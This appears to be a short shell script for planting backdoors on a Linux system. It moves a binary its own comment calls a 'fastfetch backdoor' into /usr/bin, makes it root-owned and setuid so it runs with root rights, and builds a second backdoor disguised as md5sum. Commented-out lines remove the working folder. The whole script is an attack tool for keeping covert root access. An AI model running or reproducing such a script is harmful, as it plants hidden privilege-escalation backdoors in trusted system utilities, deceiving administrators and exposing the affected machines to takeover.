# deploy fastfetch backdoor
echo "[+] We are ($whoami)"
mv ./fastfetch /usr/bin/fastfetch
chown root:root /usr/bin/fastfetch
chmod 4755 /usr/bin/fastfetch

bash ./md5sum_backdoor/build.sh

# cd ..
# rm -rf ./my
